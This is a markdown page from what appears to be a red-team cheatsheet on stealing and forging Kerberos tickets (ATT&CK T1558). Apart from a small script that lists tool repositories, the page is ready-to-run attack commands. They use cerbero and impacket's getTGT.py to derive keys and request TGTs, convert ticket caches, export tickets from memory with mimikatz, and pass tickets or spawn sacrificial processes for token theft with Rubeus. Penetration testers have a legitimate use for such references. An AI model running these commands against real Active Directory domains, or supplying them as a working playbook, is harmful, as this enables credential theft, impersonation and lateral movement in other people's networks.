---
layout: post
title: credentials / krb
category: 04-credentials
parent: cheatsheets
modified_date: 2023-06-09
permalink: /creds/krb
---

**Mitre Att&ck Entreprise**: [T1558 Steal and Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) 

**Menu**
<!-- vscode-markdown-toc -->
1. [prereq](#prereq)
2. [get-nthash](#get-nthash)
3. [get-tgt](#get-tgt)
4. [ccache-convert](#ccache-convert)
5. [krb-export](#krb-export)
6. [krb-ptt](#krb-ptt)

<!-- vscode-markdown-toc-config
	numbering=true
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

**Tools**
<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
<script>$(window).load(function() {var mm = ["https://api.github.com/repos/skelsec/pypykatz","https://api.github.com/repos/fortra/impacket"]; for (rep in mm) {$.ajax({type: "GET", url: mm[rep], dataType: "json", success: function(result) {$("#mm_list").append("<tr><td><a href='" + result.html_url + "' target='_blank'>" + result.name + "</a></td><td>" + result.pushed_at + "</td><td>" + result.stargazers_count + "</td><td>" + result.subscribers_count + "</td><td>" + result.language + "</td></tr>"); console.log(result);}});}console.log(result);});</script>

<link href="/sortable.css" rel="stylesheet" />
<script src="/sortable.js"></script>
<div id="mm">
    <table id="mm_list" class="sortable">
      <tr><th>_repo</th><th>_last_pushed</th><th>_stars</th><th>_watch</th><th>_language</th></tr>
    </table>
</div>

**Which OS? What Creds?**
![Windows Credentials by Auth. Service & by OS](/assets/images/win-delpy-creds-table-by-os-til-2012.png)

##  2. <a name='get-nthash'></a>cleartext-2-nthash
```
# compute nthash from clear-text password
cerbero hash $ztarg_user_pass -u $zdom_fqdn/$ztarg_user_name
$ztarg_user_nthash=""
$ztarg_user_aes256k=""
```

##  3. <a name='get-tgt'></a>get-tgt
```
getTGT.py $zdom_fqdn/$ztarg_user_name@$ztarg_dc_fqdn -aesKey $ztarg_user_aes256k -dc-ip $zdom_dc_ip
getTGT.py $zdom_fqdn/$ztarg_user_name@$ztarg_computer_fqdn -aesKey $ztarg_user_aes256k -dc-ip $zdom_dc_ip

cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_dc_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
cerbero ask -u $zdom_fqdn/$ztarg_user_name@ztarg_computer_fqdn --aes $ztarg_user_aes256k -k $zdom_dc_ip -vv
```

##  4. <a name='ccache-convert'></a>ccache-convert

* Convert linux to windows krb ticket :
```
ticketConverter.py $ztarg_user_name.ccache $ztarg_user_name.krb
cerbero convert -i $ztarg_user_name.ccache -o $ztarg_user_name.krb
```

##  5. <a name='krb-export'></a>krb-export
```powershell
cd C:\tools\mimikatz\x64
mimikatz.exe privilege:debug
kerberos::list /export
```

##  6. <a name='krb-ptt'></a>krb-ptt
```bash
# Request a TGT as the target user and pass it into the current session
# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
.\Rubeus.exe asktgt /user:$ztarg_user_name /rc4:$ztarg_user_hash /ptt

# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
.\Rubeus.exe asktgt /user:$ztarg_user_name /rc4:$ztarg_user_hash /createnetonly:C:\Windows\System32\cmd.exe
# linux
export KRB5CCNAME="$PWD/$ztarg_user_name.krb" 
```


